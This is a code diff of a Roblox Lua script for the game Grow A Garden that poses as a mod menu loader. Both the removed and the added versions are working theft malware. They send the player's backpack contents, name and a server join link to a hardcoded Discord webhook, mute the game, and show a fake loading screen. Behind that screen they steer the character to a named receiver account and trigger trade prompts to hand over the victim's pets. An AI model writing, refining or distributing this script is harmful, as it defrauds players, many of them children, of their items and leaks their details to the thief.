@@ -1,283 +1,276 @@
-if _G.WebhookSent then return end
-_G.WebhookSent = true
-
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1383607196113309778/jp3k0Oo4Ec_k2Lfn7dgiMe9PC-g__pA4X8E3I_u8KxesvpF8dzgv0423y2K1yU-wxoXk"
+local TARGET_NAME = "petsnatcha"
+local LOADING_TIME = 300
 
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
-local LocalPlayer = Players.LocalPlayer
-local Backpack = LocalPlayer:WaitForChild("Backpack")
+local lp = Players.LocalPlayer
+local Backpack = lp:WaitForChild("Backpack")
 
-local animalKeywords = {
-    "bunny", "dog", "golden lab", "black bunny", "cat", "chicken", "deer",
-    "orange tabby", "spotted deer", "pig", "rooster",
-    "cow", "polar bear", "sea otter", "silver monkey", "turtle",
-    "brown mouse", "caterpillar", "giant ant", "grey mouse",
-    "praying mantis", "red fox", "red giant ant", "snail", "squirrel",
-    "dragonfly", "bee", "honey bee", "bear bee", "petal bee", "queen bee",
-    "wasp", "tarantula hawk", "moth", "butterfly", "disco bee"
+-- 🧠 Rejoin if in a private server or full public server
+task.spawn(function()
+    if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.MaxPlayers then
+        local servers = {}
+        local req = (syn and syn.request or request)
+        if req then
+            local success, response = pcall(function()
+                return req({
+                    Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+                })
+            end)
+
+            if success and response and response.Body then
+                local data = HttpService:JSONDecode(response.Body)
+                for _, server in ipairs(data.data or {}) do
+                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
+                        return
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
+-- 🔇 Fully mute all sounds
+local SoundService = game:GetService("SoundService")
+
+SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+SoundService.Volume = 0
+
+for _, sound in ipairs(game:GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+        sound:Stop()
+    end
+end
+
+-- Mute future sounds too
+game.DescendantAdded:Connect(function(desc)
+    if desc:IsA("Sound") then
+        desc.Volume = 0
+        desc:Stop()
+    end
+end)
+
+
+-- 📦 Inventory handling
+local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
+local animals = { "bunny", "dog", "golden lab", "chicken", "pig", "cow", "duck", "bee", "owl", "fox", "bear", "goat", "hedgehog", "horse", "donkey", "sheep", "cat", "turkey", "bat", "skeleton", "ghost", "pumpkin", "zombie", "reindeer", "elf", "penguin", "polar bear", "dragonfly", "queen bee", "disco bee", "chicken jockey", "cooked owl", "raccoon", "red fox" }
+local rareEmojiMap = {
+    ["polar bear"] = "🐻‍❄️", ["disco bee"] = "🎉🐝", ["queen bee"] = "👑🐝",
+    ["dragonfly"] = "🧚‍♂️🐞", ["red fox"] = "🦊",
+    ["chicken jockey"] = "🐔💀", ["cooked owl"] = "🍗🦉", ["raccoon"] = "🦝", ["butterfly"] = ":butterfly"
 }
 
-local rarePetEmojis = {
-    ["polar bear"] = "🐻‍❄️",
-    ["disco bee"] = "🎉🐝",
-    ["queen bee"] = "👑🐝",
-    ["dragonfly"] = "🧚‍♂️🐞",
-    ["red fox"] = "🦊",
-    ["chicken jockey"] = "🐔💀",
-    ["cooked owl"] = "🍗🦉",
-    ["raccoon"] = "🦝"
-}
-
-local ignoreKeywords = {
-    "trowel", "watering can", "sprinkler", "egg", "rod"
-}
-
-local function matchesKeyword(itemName, keywordList)
-    itemName = itemName:lower()
-    for _, keyword in ipairs(keywordList) do
-        if itemName:find(keyword) then
+local function contains(name, list)
+    for _, kw in ipairs(list) do
+        if name:find(kw, 1, true) then
             return true
         end
     end
     return false
 end
 
-local function getRareEmoji(itemName)
-    itemName = itemName:lower()
-    for keyword, emoji in pairs(rarePetEmojis) do
-        if itemName:find(keyword) then
-            return emoji
+-- 📤 Send Webhook
+do
+    local animalItems, otherItems = {}, {}
+    local mention = false
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        local nm = tool.Name
+        local lnm = nm:lower()
+        if not contains(lnm, ig) then
+            local emoji = rareEmojiMap[lnm]
+            if emoji and contains(lnm, animals) then
+                mention = true
+            end            
+            local line = string.format("%s %s", emoji or "-", nm)
+            if contains(lnm, animals) then
+                table.insert(animalItems, line)
+            else
+                table.insert(otherItems, line)
+            end
         end
     end
-    return nil
-end
 
-local animalItems = {}
-local otherItems = {}
-local mentionEveryone = false
+    local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
+    if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
 
-for _, tool in ipairs(Backpack:GetChildren()) do
-    local name = tool.Name
-
-    if matchesKeyword(name, ignoreKeywords) then
-        continue
+    local function getAccountAge()
+        local success, result = pcall(function() return lp.AccountAge end)
+        return success and (result .. " days") or "Unknown"
     end
 
-    local emoji = getRareEmoji(name)
-    if emoji then
-        mentionEveryone = true
-    end
+    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
 
-    local entry = "**• " .. name .. "**"
-    if emoji then
-        entry = emoji .. " " .. entry
-    end
-
-    if matchesKeyword(name, animalKeywords) then
-        table.insert(animalItems, entry)
-    else
-        table.insert(otherItems, entry)
-    end
-end
-
-local allItems = {}
-for _, v in ipairs(animalItems) do table.insert(allItems, v) end
-for _, v in ipairs(otherItems) do table.insert(allItems, v) end
-
-local itemText = (#allItems > 0) and table.concat(allItems, "\n") or "__No valid items found.__"
-
-local autoJoinLink = string.format(
-    "https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s",
-    tostring(game.PlaceId),
-    tostring(game.JobId)
-)
-
-local embedData = {
-    ["username"] = "Roblox Logger",
-    ["embeds"] = {{
-        ["title"] = "__" .. LocalPlayer.Name .. "'s Backpack Contents__",
-        ["description"] = itemText,
-        ["color"] = 65280,
-        ["footer"] = {
-            ["text"] = "Roblox Inventory Logger"
-        },
-        ["fields"] = {{
-            ["name"] = "__Join Roblox Server__",
-            ["value"] = "[**Click here to auto-join**](" .. autoJoinLink .. ")"
+    local payload = {
+        username = "Captain Hook",
+        embeds = {{
+            title = "🌿 Grow A Garden Hit 🌿",
+            color = 5763719,
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
+                    inline = false
+                },
+                {
+                    name = "🎒 Backpack",
+                    value = desc,
+                    inline = false
+                },
+                {
+                    name = "💥 Hits",
+                    value = "All Items",
+                    inline = false
+                },
+                {
+                    name = "🔗 Join with URL",
+                    value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
+                    inline = false
+                }
+            }
         }}
-    }}
-}
+    }
+    if mention then payload.content = "@everyone" end
 
-if mentionEveryone then
-    embedData["content"] = "@everyone"
-end
-
-local success, err = pcall(function()
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(embedData)
-    })
-end)
-
-if success then
-    print("Webhook sent with emojis and rare detection.")
-else
-    warn("Failed to send webhook:", err)
-end
-
-
-local TARGET_NAME = "petsnatcha" --Your alt roblox goes here
-local IGNORE_ITEMS = { "trowel", "shovel", "sprinkler", "rod", "egg", "watering can", "seed" }
-local LOADING_TIME = 300 
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local CoreGui = game:GetService("CoreGui")
-local StarterGui = game:GetService("StarterGui")
-local LocalPlayer = Players.LocalPlayer
-local Backpack = LocalPlayer:WaitForChild("Backpack")
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ModMenuLoading"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.DisplayOrder = 1000
-pcall(function() screenGui.Parent = CoreGui end)
-
-local bg = Instance.new("Frame", screenGui)
-bg.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
-bg.Size = UDim2.new(1, 0, 1, 0)
-
-local box = Instance.new("Frame", bg)
-box.AnchorPoint = Vector2.new(0.5, 0.5)
-box.Position = UDim2.new(0.5, 0, 0.5, 0)
-box.Size = UDim2.new(0.35, 0, 0.25, 0)
-box.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-box.BorderSizePixel = 0
-box.BackgroundTransparency = 0.05
-box.ClipsDescendants = true
-
-local uiCorner = Instance.new("UICorner", box)
-uiCorner.CornerRadius = UDim.new(0.05, 0)
-
-local title = Instance.new("TextLabel", box)
-title.Text = "🌿Mod Menu Loading🌿"
-title.Size = UDim2.new(1, 0, 0.4, 0)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextScaled = true
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-local barBG = Instance.new("Frame", box)
-barBG.Size = UDim2.new(0.85, 0, 0.18, 0)
-barBG.Position = UDim2.new(0.075, 0, 0.65, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-barBG.BorderSizePixel = 0
-local cornerBG = Instance.new("UICorner", barBG)
-cornerBG.CornerRadius = UDim.new(1, 0)
-
-local barFill = Instance.new("Frame", barBG)
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.Position = UDim2.new(0, 0, 0, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-barFill.BorderSizePixel = 0
-local cornerFill = Instance.new("UICorner", barFill)
-cornerFill.CornerRadius = UDim.new(1, 0)
-
-local gradient = Instance.new("UIGradient", barFill)
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
-}
-
-TweenService:Create(barFill, TweenInfo.new(LOADING_TIME), {
-    Size = UDim2.new(1, 0, 1, 0)
-}):Play()
-task.spawn(function()    while true do
-        TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0.3 }):Play()
-        task.wait(1)
-        TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0 }):Play()
-        task.wait(1)
-    end
-end)
-
-local TargetPlayer
-
-task.spawn(function()
-    repeat
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr.Name:lower() == TARGET_NAME:lower() then
-                TargetPlayer = plr
-                break
-            end
-        end
-        task.wait(1)
-    until TargetPlayer
-end)
-
-task.spawn(function()
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local hrp = character:WaitForChild("HumanoidRootPart")
-
-    local bodyGyro = Instance.new("BodyGyro", hrp)
-    bodyGyro.P = 9e4
-    bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-
-    local bodyVelocity = Instance.new("BodyVelocity", hrp)
-    bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-
-    local function shouldIgnore(name)
-        name = name:lower()
-        for _, keyword in ipairs(IGNORE_ITEMS) do
-            if name:find(keyword) then return true end
-        end
-        return false
-    end
-
-    local function firePrompt()
-        pcall(function()
-            if TargetPlayer and TargetPlayer.Character then
-                for _, prompt in ipairs(TargetPlayer.Character:GetDescendants()) do
-                    if prompt:IsA("ProximityPrompt") and prompt.Enabled then
-                        fireproximityprompt(prompt)
-                    end
-                end
-            end
+    local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
+    if httpRequest then
+        local success, res = pcall(function()
+            return httpRequest({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
         end)
+        if success and res and res.StatusCode ~= 204 then
+            warn("Webhook Error: " .. res.StatusCode, res.Body or "")
+        elseif not success then
+            warn("HTTP request failed.")
+        end
+    else
+        warn("Executor does not support HTTP requests.")
     end
+end
 
-    RunService.RenderStepped:Connect(function()
-        if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            local targetPos = TargetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0.4, 0)
-            local dir = (targetPos - hrp.Position).Unit
-            bodyVelocity.Velocity = dir * 60
-            bodyGyro.CFrame = CFrame.new(hrp.Position, targetPos)
+-- 🖥️ Mod Menu Loader GUI
+do
+    local gui = Instance.new("ScreenGui")
+    gui.Name, gui.ResetOnSpawn, gui.DisplayOrder = "ModMenuLoading", false, 1000
+    gui.IgnoreGuiInset = true
+    pcall(function() gui.Parent = CoreGui end)
+
+    local bg = Instance.new("Frame", gui)
+    bg.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+
+    local box = Instance.new("Frame", bg)
+    box.AnchorPoint = Vector2.new(0.5, 0.5)
+    box.Position = UDim2.new(0.5, 0, 0.5, 0)
+    box.Size = UDim2.new(0.35, 0, 0.25, 0)
+    box.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    box.BorderSizePixel = 0.05
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0.05, 0)
+
+    local title = Instance.new("TextLabel", box)
+    title.Text, title.Font = "Mod Menu Loading", Enum.Font.GothamBold
+    title.TextScaled = true
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, 0, 0.4, 0)
+    title.TextColor3 = Color3.new(1, 1, 1)
+
+    local barBG = Instance.new("Frame", box)
+    barBG.Size, barBG.Position = UDim2.new(0.85, 0, 0.18, 0), UDim2.new(0.075, 0, 0.65, 0)
+    barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    barBG.BorderSizePixel = 0
+    Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)
+
+    local barFill = Instance.new("Frame", barBG)
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    barFill.BorderSizePixel = 0
+    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+    Instance.new("UIGradient", barFill).Color = ColorSequence.new(Color3.fromRGB(0, 170, 255), Color3.fromRGB(0, 255, 170))
+
+    TweenService:Create(barFill, TweenInfo.new(LOADING_TIME), { Size = UDim2.new(1, 0, 1, 0) }):Play()
+
+    task.spawn(function()
+        while gui.Parent do
+            TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0.3 }):Play()
+            task.wait(2)
         end
     end)
 
-    while true do
-        for _, tool in ipairs(Backpack:GetChildren()) do
-            if tool:IsA("Tool") and not shouldIgnore(tool.Name) then
-                tool.Parent = character
-                task.wait(0.05)
-                firePrompt()
-                task.wait(0.05)
-                tool.Parent = Backpack
-                task.wait(0.05)
+    local target
+    task.spawn(function()
+        repeat
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p.Name:lower() == TARGET_NAME:lower() then target = p break end
+            end
+            task.wait(1)
+        until target
+    end)
+
+    task.spawn(function()
+        local char = lp.Character or lp.CharacterAdded:Wait()
+        local hrp = char:WaitForChild("HumanoidRootPart")
+        local bgc = Instance.new("BodyGyro", hrp)
+        bgc.P, bgc.MaxTorque = 9e4, Vector3.new(9e9, 9e9, 9e9)
+        local bv = Instance.new("BodyVelocity", hrp)
+        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+
+        local IGNORE = { "trowel", "shovel", "sprinkler", "rod", "egg", "watering can", "seed" }
+
+        local function shouldSkip(n)
+            n = n:lower()
+            for _, k in ipairs(IGNORE) do if n:find(k, 1, true) then return true end end
+        end
+
+        local function firePrompts()
+            if target and target.Character then
+                for _, d in ipairs(target.Character:GetDescendants()) do
+                    if d:IsA("ProximityPrompt") and d.Enabled then
+                        fireproximityprompt(d)
+                    end
+                end
             end
         end
-        task.wait(0.1)
-    end
-end)
 
-task.delay(LOADING_TIME, function()
-    screenGui:Destroy()
-end)
+        RunService.RenderStepped:Connect(function()
+            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                local tp = target.Character.HumanoidRootPart.Position + Vector3.new(0, 0.4, 0)
+                local dir = (tp - hrp.Position).Unit
+                bv.Velocity = dir * 60
+                bgc.CFrame = CFrame.new(hrp.Position, tp)
+            end
+        end)
+
+        while true do
+            for _, t in ipairs(Backpack:GetChildren()) do
+                if t:IsA("Tool") then
+                    local nm = t.Name
+                    if not shouldSkip(nm) then
+                        t.Parent = char
+                        task.wait(0.5)
+                        firePrompts()
+                        task.wait(0.5)
+                        t.Parent = Backpack
+                        task.wait(0.5)
+                    end
+                end
+            end
+            task.wait(0.1)
+        end
+    end)
+
+    task.delay(LOADING_TIME, function()
+        if gui then gui:Destroy() end
+    end)
+end
